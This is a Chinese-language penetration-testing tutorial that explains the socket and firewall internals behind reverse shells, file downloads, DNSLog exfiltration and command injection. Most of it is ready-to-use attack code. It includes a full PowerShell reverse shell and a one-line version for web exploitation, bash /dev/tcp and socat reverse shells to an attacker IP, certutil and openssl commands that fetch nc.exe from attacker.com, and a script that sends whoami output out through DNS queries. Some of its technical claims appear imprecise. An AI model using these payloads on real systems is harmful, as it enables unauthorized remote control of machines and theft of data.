# 渗透测试命令入门和网络通信原理

## 一、反弹Shell的TCP Socket底层模型

### 1. 从系统调用层理解正反向连接

无论正向还是反向，所有Shell反弹的底层都是**TCP Socket通信**，遵循标准的C/S架构系统调用链：

| 角色 | 系统调用序列 | 作用 |
|------|-------------|------|
| 服务端（监听方） | `socket()` → `bind()` → `listen()` → `accept()` | 在指定端口等待客户端连接 |
| 客户端（连接方） | `socket()` → `connect()` | 向服务端发起TCP三次握手 |

**`nc`的本质**：是对上述系统调用的命令行封装，`-l`参数触发`listen()+accept()`，`-e`参数在`accept()`成功后，将新建立的Socket文件描述符与目标程序（`cmd.exe`或`/bin/sh`）的stdin/stdout/stderr绑定。

### 2. Shell与Socket绑定的操作系统底层操作（以Linux正向连接为例）

当执行 `nc -e /bin/sh -lvp 5666` 时，操作系统内核发生以下事件序列：

1. `nc`进程调用`socket(AF_INET, SOCK_STREAM, 0)` → 创建IPv4 TCP Socket，获得文件描述符（假设fd=3）
2. `nc`调用`bind(fd=3, port=5666)` → 将Socket绑定到本地5666端口
3. `nc`调用`listen(fd=3, backlog=5)` → 进入监听状态
4. 攻击端执行`connect()`发送SYN包，三次握手完成后，服务端内核为此次连接分配新Socket（fd=4），`accept()`返回fd=4
5. `nc`调用`fork()`创建子进程
6. 子进程执行`dup2(fd=4, 0)`、`dup2(fd=4, 1)`、`dup2(fd=4, 2)` —— 将fd=4（网络Socket）复制为Shell进程的stdin、stdout、stderr
7. 子进程调用`execve("/bin/sh", NULL, NULL)` → Shell进程启动，其所有标准流已重定向到Socket

**关键结论**：反弹Shell的本质是一个**网络进程间通信**（IPC）模型，将终端输入输出流通过TCP传输，与SSH、Telnet在协议层同构。

## 二、TCP三次握手与防火墙状态追踪

### 1. 正向连接被防火墙阻断的精确位置

**正向连接三步握手流程**：

1. 攻击端发送TCP SYN包（seq=x）→ 目标服务器
2. 防火墙检查入站规则：源IP未知 + 目标端口5666 + 状态=**NEW**
3. Windows防火墙默认策略：阻止入站NEW连接 → 丢弃SYN包，不回复
4. 攻击端收不到SYN-ACK，重试数次后报`Connection timed out`

**阻断发生在三次握手第一步**，在连接尚未建立时就被中断，因此`nc -lvp`监听的`accept()`永远不会被触发。

### 2. 反向连接绕过防火墙的ESTABLISHED机制

**有状态防火墙的连接状态表（conntrack）** ：

| 状态 | 含义 | 入站默认策略 |
|------|------|-------------|
| **NEW** | 第一个包，试图建立新连接 | 阻止（需显式规则放行） |
| **ESTABLISHED** | 属于已成功建立连接的数据包 | 放行（无需规则） |
| **RELATED** | 与已有连接相关的辅助连接 | 通常放行 |
| **INVALID** | 无法识别的畸形包 | 丢弃 |

**反向连接绕过流程**：

1. 攻击端监听：`nc -lvp 5666`
2. 目标（被控端）主动发起TCP SYN包 → 攻击端（属于出站NEW，默认允许）
3. 攻击端回复SYN-ACK → 目标（此时该数据包是响应目标主动发起的连接，防火墙标记为ESTABLISHED）
4. 目标防火墙查看到ESTABLISHED状态 → 默认放行
5. 三次握手完成 → 连接建立
6. 攻击端后续发送的`whoami`命令数据包，目标防火墙检查到该数据包属于已存在的连接（源IP、源端口、目标IP、目标端口四元组匹配）→ 放行

**Windows防火墙在入站ESTABLISHED状态的具体行为**：

Windows防火墙的高级安全策略中，入站规则的默认作用域为“允许来自以下IP的流量：任何IP”，但**仅当该流量与现有出站连接匹配时**才生效。反向连接正好满足此条件：目标先主动出站连接攻击端，之后攻击端发送的命令数据包被视为“该出站连接的响应流量”而放行。

## 三、PTY伪终端：为何nc反弹Shell无法执行交互式命令

### 1. 终端设备（TTY）与管道（Pipe）的区别

| 特性 | 终端设备（TTY/PTY） | 匿名管道（Pipe） |
|------|---------------------|------------------|
| `isatty()`返回值 | 1（真） | 0（假） |
| 作业控制（fg/bg） | 支持 | 不支持 |
| 信号传递（SIGINT/Ctrl+C） | 发送到前台进程组 | 发送到所有进程 |
| 终端类型（TERM） | 可设置（如xterm-256color） | 无 |

`nc -e /bin/sh`启动的是**非交互式Shell**，其stdin/stdout绑定到Socket文件描述符，而非终端设备。因此：

- `isatty(STDIN_FILENO)`返回0 → Shell启动时不加载交互式配置文件（`.bashrc`、`.bash_profile`）
- 作业控制被禁用 → `vim`、`top`、`less`需要终端信息初始化，报错`Error opening terminal`或卡死
- 信号`SIGINT`（Ctrl+C）发送到整个进程组 → 不仅终止当前命令，连`nc`连接一并中断

### 2. Python PTY Spawn的底层操作

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

**底层系统调用序列**：

1. `pty.openpty()` → 打开一个伪终端设备对，返回主设备fd（ptmx）和从设备fd（pts）
2. `os.fork()`创建子进程
3. 子进程调用`setsid()`创建新会话，调用`ioctl(TIOCSCTTY)`将从设备设为控制终端
4. 子进程`dup2(pts_fd, 0)`、`dup2(pts_fd, 1)`、`dup2(pts_fd, 2)`重定向标准流
5. 子进程`execve("/bin/bash")`启动Shell，此时`isatty(0)`返回1
6. 父进程将Socket fd与ptmx fd之间双向转发数据

此时Shell处于完整的交互式模式，`vim`、`sudo`、`Ctrl+C`均可正常工作。

## 四、Windows无nc时的原生反弹Shell（纯PowerShell）

当目标Windows无法下载nc.exe时，可利用PowerShell .NET类直接实现TCP反弹，无需额外文件落地：

```powershell
$client = New-Object System.Net.Sockets.TCPClient('攻击机IP',5666);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback = (iex $data 2>&1 | Out-String);
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

**底层类库调用链**：

```
System.Net.Sockets.TCPClient → System.Net.Sockets.Socket → Winsock API → TCP/IP协议栈
```

- `TCPClient`构造函数执行`socket()` + `connect()`
- `GetStream()`返回`NetworkStream`对象，封装了Socket的读写操作
- `NetworkStream.Read()`对应`recv()`系统调用
- `NetworkStream.Write()`对应`send()`系统调用
- `iex`（`Invoke-Expression`）负责执行接收到的命令字符串并捕获输出

**一行命令注入版本（用于Web漏洞利用）** ：

```cmd
powershell -c "$c=New-Object System.Net.Sockets.TCPClient('1.2.3.4',5666);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sb3=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb3,0,$sb3.Length);$s.Flush()};$c.Close()"
```

## 五、文件下载命令的底层协议栈

### 1. Windows certutil的完整API调用链

`certutil -urlcache -split -f http://attacker.com/nc.exe C:\nc.exe` 实际调用：

```
certutil.exe
  └── URLDownloadToCacheFileW (wininet.dll)
        └── InternetOpenUrlW
              └── HTTP协议栈 (HTTP.sys)
                    └── TCP/IP协议栈 (tcpip.sys)
                          └── 网卡驱动
```

- 使用`wininet.dll`，自动适配系统代理设置（IE代理）
- 缓存机制：`-f`参数强制绕过缓存重新下载
- `-split`将下载文件分割后重组合并（处理大文件）

### 2. Linux wget/curl的库依赖与精简系统适配

| 工具 | 依赖动态库 | 精简系统（Alpine/BusyBox）兼容性 |
|------|-----------|--------------------------------|
| `wget` | libssl、libcrypto、libproxy | BusyBox版本的wget可能不支持HTTPS |
| `curl` | libcurl、libssl | 同上，HTTPS需额外CA证书包 |
| `python3` | libpython3.x | 部分精简镜像已移除python |

**备选方案（支持HTTPS的纯Shell下载，利用openssl s_client）** ：

```bash
#!/bin/sh
# 利用openssl s_client建立TLS连接下载HTTPS文件
echo -e "GET /nc.exe HTTP/1.0\nHost: attacker.com\n\n" | openssl s_client -quiet -connect attacker.com:443 2>/dev/null > /tmp/nc.exe
```

## 六、DNSLog带外查询的协议细节与约束

### 1. DNS域名标签（Label）的RFC 1035规定

DNS域名由标签（`.`分隔）组成，每个标签的合法字符集：

| 字符类型 | 是否允许 | 处理方式 |
|----------|----------|----------|
| 字母（a-z） | ✅ 允许 | 直接拼接 |
| 数字（0-9） | ✅ 允许 | 直接拼接 |
| 连字符（`-`） | ✅ 允许 | 直接拼接 |
| 下划线（`_`） | ❌ 不允许（仅SRV记录的`_tcp`等例外） | 替换为`-`或`_US_` |
| 反斜杠（`\`） | ❌ 不允许 | 替换为`_BS_`或删除 |
| 正斜杠（`/`） | ❌ 不允许 | 替换为`_FS_` |
| 空格 | ❌ 不允许 | 替换为`_SP_` |
| 点（`.`） | ❌ 不允许（保留为标签分隔符） | 无需处理（作为结果中的分隔符保留即可） |

**实战完整过滤方案（PowerShell）** ：

```powershell
$x = whoami
$x = $x -replace "\\","_BS_"      # 反斜杠
$x = $x -replace "/","_FS_"       # 正斜杠
$x = $x -replace " ","_SP_"       # 空格
$x = $x -replace "_","_US_"       # 下划线
ping ($x + ".dnslog.cn")
```

### 2. DNS查询走UDP 53而非ICMP

`ping`命令在执行前，操作系统必须先对域名进行DNS解析。因此执行`ping xxxx.dnslog.cn`时的实际网络流量：

1. 操作系统向配置的DNS服务器（如`8.8.8.8`）发起UDP 53查询：`TYPE A, NAME xxxx.dnslog.cn`
2. DNS服务器递归查询，最终将请求转发到`dnslog.cn`的权威NS服务器（攻击者可控）
3. 攻击者NS服务器记录完整查询域名 → 获得外带数据

**关键修正**：DNSLog利用走的是**UDP 53端口的DNS协议**，而非ICMP。仅当防火墙允许UDP 53出站（企业通常放行以保证域名解析正常）时，此方法才有效。ICMP协议本身不参与数据传输，`ping`仅作为触发DNS查询的命令载体。

### 3. DNSLog平台利用的两种记录类型

| 记录类型 | 查询内容 | 适用场景 |
|----------|----------|----------|
| A记录查询 | 域名 → IPv4地址 | 常规DNSLog利用 |
| TXT记录查询 | 域名 → 文本字符串 | 需要接收更长数据时（TXT记录支持256字节） |

`ping`默认触发**A记录查询**，数据长度受限（域名总长不超过253字节，单标签不超过63字节）。如需传输更长数据，可改用`nslookup -type=TXT xxxx.dnslog.cn`。

## 七、命令注入中管道符的短路逻辑与选择策略

### 1. Windows管道符的精确执行逻辑

| 符号 | 前命令返回值 | 后命令是否执行 | 利用可靠性 |
|------|-------------|---------------|-----------|
| `|` | 无论成败 | **无条件执行** | ⭐⭐⭐⭐⭐（最推荐） |
| `&` | 无论成败 | **无条件执行** | ⭐⭐⭐⭐⭐（最推荐） |
| `||` | 成功（0） | **不执行** | ⭐⭐（依赖前命令成败） |
| `&&` | 失败（非0） | **不执行** | ⭐⭐（依赖前命令成败） |

### 2. URL编码坑点

在HTTP GET参数中，`&`会被服务器解析为参数分隔符：
```
原始注入：127.0.0.1 & whoami
URL传输：127.0.0.1 %26 whoami   # &需要URL编码为%26
```
若未编码，服务器接收到的参数值为`127.0.0.1 `（`&`后的部分被解析为下一个参数`whoami`），导致注入失败。

### 3. Linux管道符的精确执行逻辑

| 符号 | 前命令返回值 | 后命令是否执行 | 与Windows差异 |
|------|-------------|---------------|--------------|
| `;` | 无论成败 | **无条件执行** | Windows无此符号 |
| 反引号 | 执行子命令 | 替换为输出 | Windows CMD无此能力 |
| `$()` | 执行子命令 | 替换为输出 | Windows CMD无此能力 |

**`;`的优势**：不受前命令返回值影响，即使`ping`失败，后续命令仍执行，可靠性最高。

## 八、Linux `/dev/tcp`伪设备反弹（无需nc）

Bash内置了对`/dev/tcp`的特殊解析，不访问文件系统，而是直接建立TCP连接：

```bash
# 正向连接（目标监听，Bash本身不支持监听，需配合nc或socat）
# 反向连接（目标主动外联）
bash -i >& /dev/tcp/攻击机IP/5666 0>&1
```

**底层操作**：

1. Bash解析到`/dev/tcp/1.2.3.4/5666`时，直接调用`socket()` + `connect()`
2. `>&`表示stdout+stderr合并重定向到Socket
3. `0>&1`表示stdin重定向到stdout（即Socket）
4. `bash -i`启动交互式Shell，`-i`强制启用交互模式（即便stdin不是终端）

**与nc反弹的对比**：

| 特性 | `nc -e` | `/dev/tcp` |
|------|---------|------------|
| 是否需要nc工具 | 是 | 否（Bash内置） |
| 是否支持PTY | 否（非交互式） | 是（`bash -i`可强制交互） |
| 适用系统 | 有nc即可 | 需Bash 2.04+ |

## 九、Socat：功能更强的反弹Shell方案

`nc`功能有限，`socat`支持更多协议和加密：

```bash
# 反向连接（目标执行）
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:攻击机IP:5666

# 正向连接（目标监听）
socat tcp-listen:5666,reuseaddr exec:'bash -li',pty,stderr,setsid,sigint,sane
```

**参数含义**：

| 参数 | 底层作用 |
|------|----------|
| `pty` | 分配伪终端，使Shell认为自己在真实终端中运行 |
| `stderr` | 将stderr重定向到主进程 |
| `setsid` | 创建新会话，独立于父进程终端 |
| `sigint` | 正确处理Ctrl+C信号 |
| `sane` | 设置合理的终端参数（回显、行缓冲等） |

## 十、关键知识点速查修正表

| 技术点 | 常见错误表述 | 精确原理 |
|--------|-------------|----------|
| Windows管道符`&` | “后台执行” | 严格定义为**命令分隔符**，无条件顺序执行前后命令 |
| Linux反引号 | “执行命令” | 严格定义为**命令替换**，Shell先执行子命令，将stdout替换到外层命令的参数位置 |
| 反弹Shell底层 | “nc工具实现” | 底层是**TCP Socket通信**，nc仅封装了socket()/bind()/listen()/accept()/connect()的调用过程 |
| 正向连接 | “我连他” | 严格定义为**被控端执行`-l`监听，控制端主动发起`connect()`** |
| 反向连接 | “他连我” | 严格定义为**控制端执行`-l`监听，被控端主动发起`connect()`** |
| 防火墙对正向的阻断 | “入站限制” | 精确位置为**TCP三次握手第一步SYN包被丢弃**，因状态为NEW且无显式放行规则 |
| 防火墙对反向的放行 | “出站放行” | 精确原因为**有状态防火墙允许ESTABLISHED状态入站**，反向连接使后续命令数据包标记为ESTABLISHED |
| DNSLog中的`ping` | “走ICMP协议” | 实际走**UDP 53端口的DNS协议**，ping仅触发域名解析过程 |
| DNS域名字符限制 | “仅不能有空格” | RFC 1035规定标签仅允许**字母、数字、连字符**，斜杠、下划线、空格均不允许 |
